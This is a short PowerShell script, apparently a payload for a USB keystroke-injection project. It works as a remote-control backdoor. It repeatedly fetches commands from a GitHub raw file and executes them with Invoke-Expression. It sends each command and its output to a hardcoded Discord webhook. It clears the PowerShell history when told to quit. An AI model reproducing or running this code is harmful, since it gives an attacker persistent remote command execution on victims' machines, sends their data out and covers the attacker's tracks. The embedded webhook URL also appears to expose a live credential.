# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Initialize a variable to store the output
$output = ""

# Start an infinite loop
while ($true) {
    try {
        # Fetch the raw content of the GitHub page (plain text)
        $command = Invoke-RestMethod -Uri $githubUrl -Headers @{"Cache-Control"="no-cache"}
        
        # Check if the command starts with '!!' and strip that part off
        if ($command -like "!!*") {
            $command = $command.Substring(2)
        }


        Write-Host $command

        # Check if the command is 'quit' and exit the loop
        if ($command.Trim() -eq "quit") {
            Write-Host "Quit command received. Exiting..."
			Invoke-Expression -Command Clear-History
            break
        }

        # Run the command
        $result = Invoke-Expression -Command $command

	#Print the output to console
	Write-Host $result

	#Post to Discord
	$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
        $payload = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" 

        # Wait for 60 seconds before the next iteration
        Start-Sleep -Seconds 60


          
    } catch {
        Write-Host "An error occurred: $_"
        $output += "An error occurred: $_`n"
        Start-Sleep -Seconds 60
    }
}
